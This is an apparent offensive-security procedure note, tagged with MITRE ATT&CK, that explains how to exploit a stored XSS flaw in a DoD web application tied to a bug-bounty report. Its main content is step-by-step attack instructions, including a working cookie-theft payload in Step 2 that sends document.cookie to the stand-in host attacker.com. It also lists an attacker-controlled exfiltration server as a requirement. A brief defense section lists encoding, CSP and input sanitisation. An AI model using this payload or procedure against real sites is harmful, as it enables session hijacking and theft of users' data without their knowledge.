---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5d3e88ca-69af-4643-80d1-548b615e38c6
created_at: '2025-12-14T03:16:31.296Z'
updated_at: '2025-12-14T03:16:31.296Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-Script-via-Stored-XSS

## Summary

This procedure demonstrates how to exploit a stored XSS vulnerability by injecting malicious JavaScript into a web application's persistent storage, such as comments or profiles, which then executes in the browsers of unsuspecting users viewing the content. In the context of the DoD application, this leads to session hijacking, arbitrary request execution, and potential data exfiltration.

## Description

Stored XSS occurs when user-supplied input containing scripts is stored on the server (e.g., in a database) and served back to users without proper escaping. Attackers submit payloads via web forms, and when other users load the page, the browser interprets the script as part of the HTML. This attack targets https://███, where a specific parameter (linked to report #1636345) fails to sanitize input. Prerequisites include access to the application and knowledge of the vulnerable endpoint. Expected outcomes: script execution enabling cookie theft (e.g., via `document.cookie`) or phishing.

## Requirements

1. Web browser access to the target application (https://███)
2. Identification of a storable input field (e.g., via manual testing or report details)
3. Attacker-controlled server for receiving stolen data (e.g., for exfiltration payloads)

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all user-generated content
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript in logs and scan inputs with WAF rules for XSS patterns
- Validate and sanitize all stored inputs server-side

## Objectives

1. Persist malicious code in the application's storage
2. Trigger execution in victim browsers for data theft or actions on behalf of the user
3. Achieve session hijacking or defacement without direct access

## Instructions

### Step 1: Identify Vulnerable Input Field

**Context**: Locate a field where user input is stored and displayed without sanitization, such as a comment section or search parameter in the DoD app.

Navigate to https://███ and test inputs by submitting benign payloads like `<script>alert(1)</script>`. Check if the alert triggers when viewing the content in another session.

### Step 2: Craft and Inject Payload

**Context**: Develop a payload tailored to the impact, starting with a test and escalating to exploitation.

Use the browser's developer console or form submission to inject:

For testing:
```html
<script>alert('Stored XSS Proof-of-Concept');</script>
```

For exploitation (cookie theft):
```html
<script>var i=new Image();i.src='http://attacker.com/log?cookie='+encodeURIComponent(document.cookie);</script>
```

Submit via the vulnerable parameter (e.g., POST request to the form endpoint).

### Step 3: Verify Execution

**Context**: Confirm the payload persists and executes in a victim's context.

View the affected page in an incognito window or share the URL with a test user. Monitor the attacker's server for incoming requests with stolen cookies.

> If successful, the script runs silently, sending session data to the attacker.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
- [[injection]]
